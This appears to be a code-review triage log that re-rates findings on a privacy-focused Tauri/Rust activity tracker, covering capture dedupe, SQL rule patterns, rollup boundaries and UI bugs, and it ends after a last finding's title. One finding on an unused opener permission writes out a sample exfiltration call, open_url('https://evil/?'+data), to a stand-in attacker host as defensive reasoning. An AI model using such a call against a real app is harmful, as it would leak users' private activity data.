title: build_recap accepts narrator prose with no numeric-token guard
assessment: REAL on main but mischaracterized as a hard-rule-6 violation. build_recap (line 56-60) accepts any non-empty trimmed narrator output as model prose and only falls back to the template on Err/empty — there is no check that the prose reuses only numbers present in the prompt. However: (1) On main the ONLY Narrator is FakeNarrator (canned test prose); no real model output flows through this path, so nothing is published to a user. (2) Hard rule 6 says the smart layer must not COUNT — it doesn't: aggregates are computed in Rust (rollup.rs), format_recap_prompt feeds pre-formatted strings, and the spike's @Generable RecapProse exposes a prose-only field (no numeric slot to fabricate into) at temperature 0.2 with explicit 'never alter numbers' instructions. The model phrases, it does not compute. A post-hoc numeric-token validator is defense-in-depth hardening, not a violation fix. (3) The real SidecarNarrator + get_recap wiring land in PR #17, which owns this path; any guard belongs there, not main-cleanup. Tests already cover success/empty/error fallback (uses_model_prose_on_success, falls_back_on_empty_model_output).
fix: Optional hardening (land in PR #17, not main): in build_recap, after a successful narrate(), reject prose containing numeric tokens not present in the formatted prompt (extract digit runs from both, require the prose's set to be a subset) and fall back to the template on mismatch; add a FakeNarrator regression test feeding prose with a fabricated number and asserting generated_by==template. Not required for correctness on main since no real narrator exists there.

title: Spike sample prompt uses compact 'h m' shorthand instead of spelled-out units
assessment: REAL but inert. The sampleFacts string (lines 83-90) does use '4h 53m', '3h 10m', '1h 30m', '1h 12m' shorthand, and the comment on line 82 claims it is 'pre-formatted exactly as Rust would' — which is inaccurate, since the production format_recap_prompt (rollup.rs:707) spells units out via human_secs_long (rollup.rs:691), e.g. 'Total active time: 4 hours 53 minutes', specifically to avoid the documented 'm -> million' misread (rollup.rs:688-690), and a Rust test (ai/mod.rs:115) asserts the prompt never contains '53m'. BUT this is the frozen Phase-3 spike — a kept historical record (per task framing), not a production code path. The string is a one-shot demo fixture exercised only by `swift run usageos-ai` with no --serve; nothing in the app consumes it. The real sidecar prompt is built in Rust and lands via PR #17. So the stale comment/shorthand is cosmetic in a non-shipping artifact, not a correctness bug. Codex's 'warning' overstates it for a kept spike.
fix: Low priority, optional: update the spike sampleFacts to mirror format_recap_prompt's spelled-out units ('Total active time: 4 hours 53 minutes', 'Leading category: Work, 3 hours 10 minutes', etc.) and current field labels, OR add a one-line comment noting the spike is a frozen record and the production prompt format lives in rollup.rs::format_recap_prompt. Since the spike is a kept artifact, leaving it as-is is also defensible.

title: Capture owns rusqlite handles outside the repository layer
assessment: Confirmed the code: line 22 imports rusqlite::Connection, resolve_focus/open_span/on_focus/on_tick take &Connection, and consume() locks db_conn (DbConnection = Arc<Mutex<Connection>>). But this is the documented D38 single-writer / D31 interim design: the consumer thread is the SOLE DB writer and owns the open span in memory. Crucially, hard rule 4 is about SQL STRINGS living in the repository layer — and they do: every actual SQL statement is in db.rs (match_exclusion, insert_event, set_span_end, find_category, enrich::infer_project). Capture passes typed inputs, gets typed outputs; it only holds the connection HANDLE to pass into repo calls, which D38 explicitly blesses. Not a hard-rule-4 violation.
fix: No change needed. If a future refactor wants stricter isolation, pass a repo trait object (e.g. SpanWriter) into consume instead of the raw Connection, but this is explicitly deferred per D38/D31.

title: Coalescing ignores cwd/project signal changes (same_window omits project fields)
assessment: Confirmed and sharpened. same_window (line 147) compares app/title/url/is_private only. Focus also carries site, project_id, project_abstain_reason. site is derived purely from url (parse_site), so a site change cannot occur without a url change — that part of Codex's claim is moot. But project_id is inferred from cwd/url/title (resolve_focus -> infer_project with ProjectSignals{cwd,url,title}), and cwd is NOT in the Focus identity nor in same_window. Real gap for terminals: cd to a different git repo in the SAME terminal window while the AX title stays identical yields a different project_id, but same_window() returns true, the old span is extended, and the new project is never written (D30). Note it also interacts with the producer title dedupe (emit finding) which may suppress the re-emit entirely.
fix: Include project_id (and project_abstain_reason) in the same_window comparison so a project change opens a new span. site is url-derived so redundant but harmless to add. Pair with fixing the producer dedupe so a cwd-only change actually re-emits a FocusEvent (otherwise on_focus never sees it).

title: Category lookup failures silently downgraded to uncategorized
assessment: Confirmed the code: open_span (line 238) matches db::find_category and on Err logs to stderr and falls back to category_id = None rather than propagating with ?. find_category returns rusqlite::Result and open_span already returns rusqlite::Result, so ? would type-check. But severity is overstated. find_category failing means a real SQLite error, rare in practice, and the chosen behavior (record the span uncategorized + keep capturing) is arguably the more honest-mirror default than dropping the whole span or killing the sole writer. It does NOT corrupt data; the row is just Uncategorized and is retroactively fixable via reprocess_logs (D47). Defensible graceful-degradation, not a real bug.
fix: Optional: propagate with `let category_id = db::find_category(conn, &focus.app, &focus.title)?;` so a genuine DB fault surfaces to consume()'s error path instead of silently miscategorizing. If keeping the fallback, add a one-line comment noting the deliberate degrade-not-drop choice.

title: AX notification registration errors are ignored
assessment: Confirmed: install_observer discards every add_notification result via `let _ = unsafe { observer.add_notification(...) }` at lines 261 and 267, and reregister_title_observer does the same (288/292). If all core registrations fail (e.g. AX denied for that pid), install_observer still returns Some(AppObserver), switch_to calls note_capture_ok(), and the health counter resets to green though no notifications are live — so get_watcher_status can read healthy while capture is silently dead for that app. Real but low severity: only mis-reports health (no data loss, no privacy issue), bounded to one app's observer, AXIsProcessTrusted is prompted separately, and the initial emit_with_title still fires once on switch. Worth small hardening, not urgent.
fix: Track success of the core APP_NOTIFICATIONS adds; if none of the focused-window/main-window notifications registered, either return None from install_observer (so note_capture_failure runs) or log a degraded-health state. Keep the optional AXTitleChanged window registration non-fatal.

title: Chrome Canary maps to the stable 'Google Chrome' AppleScript name
assessment: Confirmed: line 32 maps both com.google.Chrome and com.google.Chrome.canary to AppleScript name "Google Chrome". Chrome Canary's actual scripting/application name is "Google Chrome Canary", so when Canary is frontmost the `tell application "Google Chrome"` script targets the wrong (stable) app — it will launch/activate or query a non-frontmost/non-running app and return wrong/empty data, breaking URL + incognito detection for Canary. Severity info, not warning: Canary is a niche dev browser, AND the privacy fall-through is SAFE — a failed/empty read yields Normal(None) (keep AX title, no URL), never leaking an incognito URL. Worst case is a missing URL/project signal for Canary, not a privacy break. The mapping is also speculative (no on-device Canary verification in D33). Low-impact correctness nit.
fix: Map "com.google.Chrome.canary" => Some("Google Chrome Canary") on its own match arm, or drop the Canary bundle id until its scripting name is verified on-device (the doc-comment already warns hardcoding the wrong name silently fails — R15).

title: Unreadable Chromium privacy state keeps the AX title
assessment: Confirmed the code does what Codex says: when run_osa returns None (-1743 Automation denied, or spawn failure), inspect returns Normal(None) (line 64) and emit_with_title keeps the AX title with no URL. But this is the explicitly documented R18/D33/D8 safe-default, decided and on-device-verified. D33's note: 'Safari and Automation-denied Chromium can't be PROVEN non-private, so their titles are kept — consistent with the R18 url stance.' The privacy contract is never record an incognito URL — and the URL is dropped here. The mode check is read BEFORE the URL (C5), so a window proven Private drops both. Codex's 'fail closed on title' is a relitigation of a deliberate decision, not a new bug on main.
fix: No change required — D33/R18 documented behavior. Stricter fail-closed semantics (drop titles for every Chromium window whenever Automation consent is missing) would be a new product decision relitigating D33.

title: Producer title-only dedupe suppresses URL / cwd / private-state changes
assessment: Confirmed, strongest of the set. emit() (lines 187-197) reads only the AX title, compares to last_title, and returns early on an unchanged title BEFORE emit_with_title calls browser::inspect or terminal::front_cwd. So with an unchanged window title: (a) navigating a SPA/same-title page to a new URL, (b) cd-ing to a different repo in a terminal (new cwd -> new project), and (c) a Chromium window flipping normal<->incognito while the title text is unchanged all fail to emit a FocusEvent. The consumer keeps extending the prior span with stale url/site/project/is_private. Real signal loss; it COMPOUNDS the mod.rs:147 finding (even if same_window included project_id, the event never reaches the consumer). Privacy angle (c) is bounded: an incognito flip is usually a new window (new focus event) and usually changes the title. D33 blesses a debounce that drops chatty duplicate TITLES, not deduping on title while ignoring url/cwd/private — so this is under-specified, not sanctioned. Warning.
fix: Build the full capture identity (title + url + is_private + cwd) first, then dedupe on the whole tuple — move browser::inspect and terminal::front_cwd ahead of the dedupe check and compare a struct, not just the title. Alternative: drop producer-side dedupe and let the consumer's same_window coalescing be the single source of truth (but then also fix same_window to include project_id/url signals). Note inspect/front_cwd run osascript per emit, so prefer the full-identity compare over removing dedupe.

title: Command layer owns the rusqlite handle
assessment: Confirmed the code shape: lib.rs has `use rusqlite::Connection`, `type DbState = Arc<Mutex<Connection>>`, and every command does `db.lock()` then passes `&conn` into `db::*` repository fns. But this is the documented D38 single-writer / D31 interim design: the Tauri-state Connection (and the capture consumer) share an `Arc<Mutex<Connection>>` HANDLE on purpose. Crucially, hard rule 4 governs SQL STRINGS, and every SQL statement lives in db.rs/migrations.rs — the handlers see only `&conn` and typed repository calls (`db::get_activity_logs`, `db::set_setting`, etc.), never raw SQL or a DB statement. So rule 4 is satisfied. Codex's proposed 'repository state type' is a stylistic refactor, not a rule-4 fix. Not a violation.
fix: No change required for hard-rule compliance. If desired purely for ergonomics, a future refactor could wrap the lock acquisition in a `Repo` state type so handlers call `repo.get_activity_logs(..)` instead of `db.lock()`; track under the D38→WAL/dedicated-writer migration (R57), not as a defect.

title: Generic update_setting can set data_retention_days without pruning
assessment: Real but latent. `update_setting(key,value)` is an unrestricted key/value setter over `db::set_setting`, so calling it with key=`data_retention_days` would persist a new window WITHOUT running `cleanup_old_data` — the exact side-effect that the dedicated `set_retention_days` (line 274-280) exists to guarantee. decisions.md L171 sub-decision (4) explicitly documents WHY the two are separate. However, the bypass has no actual caller: the only frontend path is SettingsView.onRetention → setRetentionDays (src/views/SettingsView.tsx:94 → src/lib/tauri.ts:171), and updateSetting (tauri.ts:166) is used only for non-retention keys (e.g. theme). The IPC surface is the app's own trusted webview — there is no remote/untrusted invoker. So this is a footgun for a future careless caller, not an active correctness/data bug on main. Downgrade from warning to info.
fix: Guard the generic command against the retention key so it can't silently skip the prune. In `update_setting`, reject `data_retention_days` (e.g. `if key == "data_retention_days" { return Err(AppError::Db("use set_retention_days".into())); }`) and route callers to the dedicated command. Optionally enumerate the safe settable keys.

title: CSV export can overwrite a same-second export
assessment: Accurate read: the filename is `usageos-export-{now_unix()}.csv` (second resolution) and `std::fs::File::create` truncates an existing file. Two exports triggered within the same wall-clock second therefore land on the same path and the second overwrites the first. But this is a narrow edge case: export is a deliberate, manual user action (click 'Export'), files write to the app dir next to the DB (no data-loss of captured data — only a just-created export file), and the realistic blast radius is a user double-clicking within ~1s. It cannot silently lose captured history. Downgrade from warning to info.
fix: Make the name collision-proof: append a higher-resolution component (e.g. millis via `SystemTime`) to the filename, or open with `OpenOptions::new().write(true).create_new(true)` and on `AlreadyExists` retry with a `-1`, `-2` suffix. Note the no-unwrap rule still applies to any new time call.

title: opener:default grants unused URL-opening (open_url) capability
assessment: Confirmed: `opener:default` (tauri-plugin-opener 2.5.2) expands to allow-open-url + allow-reveal-item-in-dir + allow-default-urls, i.e. it grants the webview the `open_url` command for http/https/mailto/tel. The app only ever uses revealItemInDir (SettingsView.tsx:108,118) — grep shows no openUrl/open_url call anywhere in src/. So the URL-opening grant is dead and the line ALSO redundantly lists `opener:allow-reveal-item-in-dir`. Codex slightly overstates the mechanism: `open_url` shells out to the OS default browser, it is not an in-webview network call in the data path, so this is not an active hard-rule-1 breach (no code performs it). But for a privacy-first product, leaving an unused URL-opening capability is real attack-surface: a compromised/XSS'd webview could call open_url('https://evil/?'+data) to exfiltrate. Defense-in-depth tightening warranted → warning, not critical. NOTE: PR #17 modifies capabilities/default.json (sidecar wiring), so the fix must be coordinated on that branch to avoid conflict.
fix: Replace `opener:default` with only the reveal permission, and drop the now-redundant duplicate, so permissions are just `core:default`, `core:window:allow-start-dragging`, `opener:allow-reveal-item-in-dir`. Coordinate the edit with PR #17 since it also touches this file. Verify reveal-in-Finder still works after narrowing.

title: Range reads miss/overcount spans crossing day boundaries
assessment: Real on main. get_activity_logs filters `start_time >= ?1 AND start_time <= ?2` (both inclusive) and rollup::duration (rollup.rs:157) counts the FULL span `(end_time - start_time)`, never clipped to the window. Spans are NOT split at midnight (capture/mod.rs: open_span→set_span_end runs focus-change to focus-change). So a 23:50→00:10 span: counted wholly in the 23:50 day (overcounts +10m) and missing from the next day. A span starting exactly at the next midnight (start_time == prev day's `end`) satisfies both `<= end` (day i) and `>= start` (day i+1) → double-counted. This is per-day rollup skew, not data loss, and bounded to the ~1 boundary-crossing span/day; D40's away-app handling closes loginwindow/screensaver spans at lock, cutting most overnight cases. Distinct from D40 (idle/segmentation) and D40-noted dial-vs-ledger divergence. Downgraded critical→warning: real correctness skew, bounded, not misleading at scale.
fix: Use overlap+clip semantics for rollup reads: `WHERE end_time > ?1 AND start_time < ?2`, and clip each returned span to [start,end] before summing (clamp start_time=max(start_time,window_start), end_time=min(end_time,window_end)) so a crossing span is split correctly across days. Make boundary inclusive on one side only (half-open [start,end)).

title: Empty/whitespace rule pattern matches every event
assessment: Real on main. create_rule inserts pattern with no trim/non-empty check. find_category (db.rs:408) does `match_target.to_lowercase().contains(&rule.pattern.to_lowercase())` — empty pattern → contains("") → always true; reprocess_logs (db.rs:432/437) does `LIKE lower('%%')` → always true. So an empty-pattern rule sorts ALL history into one category. D45 added conflict-detection as a frontend UI affordance (processOwner) but explicitly did NOT add empty-pattern rejection at the repository boundary, so this backend gap is real and not a covered deliberate choice. User-triggered misconfiguration, fully reversible (delete rule + reprocess). Downgraded critical→warning.
fix: In create_rule, reject empty/whitespace patterns: `if pattern.trim().is_empty() { return Err(...) }` (add a typed repo error variant). Add a focused test. Optionally a CHECK(length(trim(pattern))>0) in the next migration.

title: Empty exclusion pattern drops or privatizes every capture
assessment: Real on main and the most severe of this set. create_exclusion has no trim/non-empty guard. match_exclusion (db.rs:801) does `!target.contains(&ex.pattern.to_lowercase())` — empty pattern → contains("") → matches everything. An empty `exclude` rule makes EVERY captured event get dropped (never written — Resolved::Excluded path), so the day silently goes blank with no recovery of the lost spans; an empty `private` rule blanks ALL titles/urls at write time. This is data-loss + a privacy/correctness footgun, user-triggerable via the exclusion modal. Not covered by D8 (D8 is about the exclusion mechanism, not an empty-pattern guard). Kept critical: silent permanent loss of all capture.
fix: In create_exclusion, reject empty/whitespace patterns before insert (typed error). Add a CHECK(length(trim(pattern))>0) constraint in the next migration for defense in depth, and a test asserting an empty pattern is rejected (not stored).

title: Alias collision silently misassigns weak project signals
assessment: Real but narrow on main. add_project_alias uses INSERT OR IGNORE against UNIQUE(alias_kind, alias_value). In practice the only alias_kind written by inference is `"name"` = a project's git-repo/folder BASENAME (enrich/project.rs:90-100), not generic tokens like 'app'/'server' as Codex framed it. Two DIFFERENT repos sharing a basename (e.g. two `api` repos): project B's `("name","api")` insert is silently ignored, alias stays pointing at A; a later weak title-only signal `api` resolves via find_project_by_alias to A, misassigning B's work. The doc comment (db.rs:592) even calls this idempotency intentional. Bounded to weak/title-only signals where no canonical cwd/url is present; strong signals (cwd remote) always resolve correctly by canonical_key. Downgraded critical→info: edge-case weak-signal mislabel, no data loss.
fix: In add_project_alias, detect an existing alias bound to a different project_id and skip/mark it (e.g. SELECT project_id first; if present and != this one, do not treat the value as a confident alias) so ambiguous basenames abstain rather than confidently resolving to the first project. Add a test for two same-basename projects.

title: Enum-like columns documented but not enforced
assessment: Real on main. rules.match_field, exclusions.match_type, exclusions.mode, sites.kind, activity_logs.project_abstain_reason are comment-only enums with no CHECK constraints; the repository accepts arbitrary strings. Invalid values are silently mis-handled: find_category treats any match_field != 'process' as a title rule (db.rs:402 else-branch), match_exclusion `continue`s on an unknown match_type/mode (db.rs:798/807) so the rule silently no-ops. This is the root shape behind findings 2/3 (no boundary validation). Note: recaps.generated_by DOES use a CHECK per standards/rust.md:160, so the pattern is established but inconsistently applied. Warning (defense-in-depth + silent no-op), not critical on its own.
fix: Add repository-side validation now (reject unknown match_field/match_type/mode/kind with a typed error) and add CHECK(col IN (...)) constraints in the next forward-only migration where the existing data is known-clean. Mirror the generated_by CHECK pattern.

title: Reprocess treats rule patterns as SQL LIKE wildcards (divergence from live)
assessment: Real on main. Live categorization find_category (db.rs:408) does literal `String::contains` (no wildcards). reprocess_logs (db.rs:429) wraps the raw pattern as `format!("%{}%", rule.pattern)` and feeds it to `LIKE`, so a pattern containing `%` or `_` becomes a SQL wildcard during history reprocessing — old events get categorized differently than new capture would. Genuine consistency bug. Bounded: real app/process names and typical user patterns rarely contain `%`/`_`, so it almost never fires in practice. Downgraded critical→warning.
fix: Match live semantics in SQL: use `instr(lower(col), lower(?1)) > 0` with the raw pattern (no %-wrapping), or keep LIKE but escape %/_ and add `ESCAPE '\\'`. Add a test with a pattern containing `%` asserting reprocess matches find_category.

title: History reprocessing is not atomic
assessment: Real on main. reprocess_logs first runs `UPDATE activity_logs SET category_id = NULL` (db.rs:420) then applies each rule in a separate execute with no enclosing transaction. If a later UPDATE fails (e.g. disk/IO error), the DB is left with all categories cleared and only some rules applied — history partially uncategorized until the user re-runs reprocess. Recoverable (idempotent re-run fixes it) and the Arc<Mutex<Connection>> single-writer (D38/D31) prevents concurrent interleave, so no torn read by other writers; the only risk is a partial failure persisting. Downgraded critical→warning: real atomicity gap, low-probability trigger, recoverable.
fix: Take `&mut Connection`, wrap the reset + all per-rule UPDATEs in one `conn.transaction()` and commit at the end so a failure rolls back to the pre-reprocess categorization. Update the single caller signature.

title: Fresh-install gate also rewrites a configured but capture-empty database
assessment: Real but very low-probability on main. Every statement gates on `(SELECT COUNT(*) FROM activity_logs) = 0` as the proxy for 'fresh install', and the header comment promises existing configuration is never modified. A user who edited categories/rules BEFORE any activity row landed still has an empty activity_logs, so the migration would rename their canonical categories, insert Personal, delete Spotify/Music rules, and add starter rules — contradicting the comment. Probability is low because capture begins immediately on launch (an activity row normally exists by the time anyone opens Settings), and migrations are forward-only (D35) so this already ran once for existing installs. Warning, not critical: narrow window, mostly historical.
fix: Gate on the exact untouched seed state instead of activity count — e.g. only rewrite when the four canonical slugs still carry their original seeded names and no user category/rule exists (NOT EXISTS user-created rows), or stamp a 'seeded_defaults' settings flag at first init and gate future migrations on that. For main this is now mostly retrospective; apply the stricter gate pattern to any future default-seeding migration.

title: Advanced 'match by window title' drawer saves unprefixed tokens as process rules
assessment: Partly real. parseRule() returns match_field:'process' for any token without a 'title:' prefix. The Advanced drawer is labelled 'Advanced — match by window title' with placeholder 'e.g. invoice' and copy 'Prefix is optional; here it's assumed.' (lines 335,350,359-360) — implying the title prefix is the default inside this drawer. So typing 'invoice' there silently creates a PROCESS rule, contradicting the drawer's stated intent. This is a real UI/behavior mismatch. HOWEVER the second half of Codex's claim is FALSE: parseRule trims first (const t = token.trim()), and the regex /^title:\s*(.+)$/ requires at least one non-space char after the colon, so 'title:   ' parses to null, not an empty catch-all rule (verified by running the regex). D44 deliberately keeps this drawer able to hold legacy/substring process rules as chips, but does NOT bless 'invoice'→process when the copy says title is assumed. Bounded: a wrong-field rule is recoverable (shows as an editable chip, re-sortable), not data loss.
fix: Inside this drawer, default unprefixed tokens to match_field:'title' to match the copy (add a flow flag or a second parser), OR change the copy/placeholder to state bare tokens are app-name (process) rules and only `title:` switches to title matching. The empty-pattern guard is already effectively present.

title: Toggling off a just-moved app leaves the old owner's rule in movedIds, deleting it on save
assessment: Real. resolveConflict(true) does two things: adds the other category's rule id to movedIds (line 155) AND adds a pending process rule to added (line 156). If the user then clicks that pending app again, toggleApp's pending-removal branch only does setAdded(a => a.filter(...)) (line 142) — it never removes the id from movedIds. On save(), `for (const rid of movedIds) await deleteRule(rid)` (line 191) still deletes the original owner's rule, so the app ends up uncategorized even though the user backed out of the move. Bounded/recoverable (reprocess is retroactive; the user can re-add), but a genuine surprising data mutation. Not a documented deliberate choice.
fix: Track the moved rule id alongside the pending add (store an optional movedRuleId on the PendingRule, or key a Map appName→movedRuleId). When removing a pending add whose move you recorded, also drop that id from movedIds.

title: Modal has max-width but no max-height/scroll — tall content can push the footer off-screen
assessment: Real. The dialog div is `w-full max-w-[430px] ... bg-bg` with no max-height and no overflow on the body (line 67 `flex flex-col gap-4`). The overlay is `flex items-center justify-center p-4` with no scroll either. CategoryEditorModal embeds an app-picker grid plus chips and can grow tall; on a short window the footer row (Cancel/Save, lines 68-70) can be pushed below the viewport and become unreachable, with no scroll to recover. A real usability/responsiveness defect, but no data loss and only on short windows — warning, not critical.
fix: Add `max-h-[calc(100vh-2rem)] flex flex-col` to the dialog, keep header/footer fixed, and make the body `overflow-y-auto flex-1` so the content scrolls while the footer stays visible.

title: Clickable ledger row is a div with onClick — not keyboard/AT reachable
assessment: Real but heavily mitigated. LedgerRow renders a div with onClick and a permanent cursor-pointer, with no role/tabIndex/keydown — so keyboard and screen-reader users cannot activate the row, yet it looks clickable. However the SAME category-isolation action is fully reachable via the canonical Chips in DayView (src/components/ui/Chip.tsx renders a real <button>, verified), so no functionality is keyboard-locked; the row is a redundant mouse convenience. Polish/a11y-affordance gap, not a blocking accessibility failure. Info.
fix: When onClick is provided, render a <button type="button"> (or add role="button", tabIndex={0}, Enter/Space handlers) and gate cursor-pointer on interactivity so non-interactive rows don't falsely signal clickability.

title: CANON_ORDER missing 'personal' slug — Personal sorts before Work
assessment: Real. CANON_ORDER = ['deep','research','comms','breaks'] (line 33) predates D47, which added the fifth canonical slug 'personal'. The sort (lines 64-68) does CANON_ORDER.indexOf(a.slug) for slugged categories; for 'personal' indexOf returns -1, which is less than 0..3, so Personal sorts AHEAD of Work/Browsing/etc. User-created (slug null) categories correctly get 99, but a canonical slug not in the list wrongly sorts first instead of last. Cosmetic ordering bug (all categories still render) but contradicts the intended canonical order in lib/categories.ts.
fix: Derive the order from CANONICAL_CATEGORIES in lib/categories.ts (export CANON_ORDER = CANONICAL_CATEGORIES.map(c=>c.slug)) and treat indexOf === -1 as the fallback bucket (map to a large index) so unknown/canonical-not-listed slugs sort after known ones, not before.

title: Hard-coded canonical display names can disagree with user-edited DB names
assessment: Real divergence. CANONICAL_CATEGORIES bakes display names (Work/Browsing/Messaging/Entertainment/Personal). D47's migration 0006 only renames FRESH installs, and CategoryEditorModal.save() calls updateCategory(category.id, trimmed, ...) for canonical categories too (line 184) — name editing is NOT blocked for built-ins (the modal only locks the colour for canonical, not the name). DayView renders the canonical Chips from the hard-coded names (lines 119-127) while the Ledger/StatTile render the backend row.name/topCategory.name (lines 105-106, 216-219). After a user renames 'Work'→'Coding', the chip shows 'Work' but the ledger/stat show 'Coding' for the same slug — inconsistent label. Bounded (cosmetic, same colour/slug) but confusing.
fix: Render legend/chip labels from backend category data (match by slug) rather than the hard-coded names; keep only slug+order in lib/categories.ts. Alternatively make canonical names non-editable in the modal so the constant stays authoritative.

title: New-category from Uncategorized drops the selected app (onNewCategory arg ignored)
assessment: Real. UncategorizedApps types onNewCategory as (appName: string) => void and calls onNewCategory(a.process_name) (UncategorizedApps.tsx line 137). SettingsView passes onNewCategory={() => setEditing({ category: null })} (line 150), discarding the app name and opening a blank CategoryEditorModal. The user picked 'New category…' for a specific uncategorized app expecting it to be pre-seeded; instead they must re-find/re-add it via the picker. No crash or data loss — the action just silently doesn't carry intent. The modal has no prop to pre-seed an app, so wiring requires a small modal change.
fix: Capture the app name (setEditing({ category: null, seedApp: appName })) and add an optional seed prop to CategoryEditorModal that pre-adds a pending process rule for that app. Until wired, hide 'New category…' from the per-app menu or document the gap.

title: Day inspector hides mixed no-project time (diverges from Timeline projectLine)
assessment: Real but minor. summarizeRun filters out NO_PROJECT and never re-adds it (lines 13-16), so for a run split between a real project and no-project time the Day inspector's projectLabel shows only the real project. Timeline's projectLine (TimelineRow.tsx lines 120-128) deliberately appends 'no project <duration>' when there are >=2 buckets — verified — so the two surfaces disagree. Mitigant: buildInspector (DayView.tsx line 235) appends sm.apps after the project label, so the off-project apps DO still appear; only the explicit 'no project <secs>' breakdown is missing. No number is wrong or lost, just less detailed than Timeline. Info-level consistency nit.
fix: Mirror TimelineRow.projectLine in summarizeRun: when there are >=2 buckets (real projects + a NO_PROJECT bucket), append `no project ${formatDuration(noProjectSecs)}` to projectLabel so the Day inspector matches the Timeline.

title: Initial getSettings load can overwrite a theme the user changed during the load
assessment: Real but a narrow race. The mount effect (lines 51-65) awaits getSettings and, if a valid saved theme comes back, calls setThemeState(saved) guarded only by `cancelled` (which only blocks after unmount). If the user toggles via setTheme (line 67) before getSettings resolves, the resolved persisted value overwrites the user's fresh choice, flipping the UI back. The window is just the initial async settings fetch (a few ms, local IPC), and any later setTheme persists+sticks, so impact is small and self-correcting on next interaction. Info.
fix: Apply the loaded value only if the user hasn't interacted: track a userTouched ref set in setTheme, or only setThemeState(saved) when current state still equals DEFAULT_THEME and no setTheme has run.

title: Degraded-banner Retry refreshes day data but not the capture health check
assessment: Real. The DegradedBanner's actionLabel='Retry' calls onAction={refresh} (lines 72-78), which only re-fetches day data via useDayData. captureHealthy is set solely by the effect keyed on [start] (lines 41-49), so getWatcherStatus is never re-queried by Retry. After capture recovers, the banner cannot clear until the view remounts or the date changes — Retry appears to do nothing for the very condition it's offered for. Same shape in TimelineView (lines 25-50) and WeekView (lines 30-57): captureHealthy effect keyed on [start], banner Retry wired to refresh only. Misleading UX on a real signal, no data risk — warning.
fix: Extract a watcher-status refresh (or fold getWatcherStatus into the data refresh) and have the banner's onAction re-run both day-data refresh and the health check (setCaptureHealthy from a fresh getWatcherStatus). Apply identically in TimelineView and WeekView.

title: SettingsView test fixture stale post-D47/Uncategorized (no Personal, 'Deep work', no Uncategorized assertion)
assessment: Real test-quality gap, not a failing test. The fixture (lines 11-26) still uses the pre-D47 name 'Deep work' for the deep slug and omits the 'personal' canonical category; the test (line 58) asserts 'the four buildable groups' and never asserts the Uncategorized group (which SettingsView renders first, lines 143-153, and the fixture even supplies one uncategorized app, line 23). It passes today (mode 'exclude'→'Excluded' label verified in primitives.tsx), so gates stay green — but it no longer reflects the five-category model or the Uncategorized-first surface, so it won't catch regressions there. Info (coverage), since merge gates are not red.
fix: Update the fixture to use the D47 display name ('Work') and add the 'personal' category; assert the 'Uncategorized' group header and the TablePlus row render. Optionally assert the five canonical categories appear.

title: Project inference owns a SQLite handle (infer_project/resolve take &Connection)
assessment: Confirmed the code: infer_project(conn: &Connection, ...) and resolve(conn, ...) call db::find_project_by_alias and db::resolve_or_create_project. But this is the documented D33/D38 design: enrichment is INLINE at capture (the cwd signal is ephemeral and must resolve live), the consumer runs on a dedicated thread owning the Arc<Mutex<Connection>>, and crucially ALL SQL strings live in db.rs — enrich only calls typed repository fns (find_project_by_alias, resolve_or_create_project), never raw SQL or a prepared stmt. Hard rule 4 (SQL in the repository layer) is satisfied; rule 4 forbids SQL/handles LEAKING into business logic, and D33 explicitly chose inline enrichment with a passed-in Connection over a batch pass. Not a violation. The 'keep enrich pure' suggestion is a defensible style preference but contradicts the locked decision and buys nothing functional.
fix: No change required. If a future refactor wants purity, infer_project could return a ProjectAssignment candidate (canonical_key + aliases + weak flag) and let the capture consumer call the repo — but that splits the cohesive resolve-or-create and is explicitly not what D33 chose.

title: Browser title fallback persists fake projects (e.g. "YouTube", "GitHub") for general/non-repo pages
assessment: Real bug. capture/mod.rs:214 builds ProjectSignals with cwd, url AND title together for the same event, so infer_project runs all three. classify_url returns NoSignal for GENERAL_HOSTS (youtube.com etc.) and for GITHUB_NON_REPO owners (notifications, settings…), then control falls through to classify_title unconditionally. classify_title('Video - YouTube') splits on ' - ' → candidate 'YouTube'; 'YouTube' is NOT in APP_NAMES (which holds Claude/Spotify/Slack/Finder/Notion/WhatsApp/Google Chrome/Brave), so it builds a weak Candidate canonical_key='YouTube' and resolve() persists a real project. Same for 'Notifications - GitHub' → 'GitHub', news sites, docs pages with ' - ' or ' — ' titles, etc. These spurious projects then surface as the project split inside runs and can feed leading_project's 'Mostly on X'. Bounded: weak candidates reconcile by name alias so one fake project doesn't fragment, projects show only as inside-detail, and many browser titles lack the ' - '/' — ' separator. But it pollutes the projects table with non-projects and produces user-visible wrong labels, contradicting D30's 'a wrong label costs more trust than a gap' and 'never a guessed project'. Not D33/D8 (those cover keeping titles for unprovable-private windows, not this inference path).
fix: In infer_project, suppress the title fallback whenever a URL was present (a browser event already had its best signal): track url_present and skip the `if let Some(title)` block when sig.url.is_some(). Title inference should only fire for editor/terminal events that carry no URL. Alternatively gate classify_title to known editor title shapes. Add a regression test: url=youtube.com + title='Video - YouTube' → Abstain('no-signal'), not Assigned.

title: leading_project can narrate a tie as the clear leader via nondeterministic max_by_key
assessment: Confirmed: leading_project sums project secs into a HashMap, max_by_key picks one of any tied maxima in unspecified iteration order, then keeps it only if secs*100 >= active*40. The doc/field says 'the single project that clearly led (>=40%)'. A 45%/45% pair would render 'Mostly on X' with X chosen arbitrarily/nondeterministically. Real but low-impact edge case: it requires two projects to BOTH clear 40% (together >=80% of active time), it's recap narration only (no count is wrong — both genuinely co-led), and 'Mostly on X' for a 45% co-leader is only mildly misleading. The nondeterminism (run-to-run flip) is the more annoying symptom than incorrectness. Downgrade from critical to info.
fix: Compute the top two project totals; return None (or keep both for prose) when the leader does not strictly exceed the runner-up, e.g. require top.secs > second.secs in addition to the 40% gate. Cheap and removes the nondeterminism.
siblings: src-tauri/src/rollup.rs:264 (build_week_view deepest_day uses max_by_key on deep_secs — same tie-nondeterminism, but 'deepest day' tolerates an arbitrary pick better)

title: Distinct user-created (slugless) categories collapse together — and into Uncategorized — because category_of maps slug=None to OTHER_SLUG
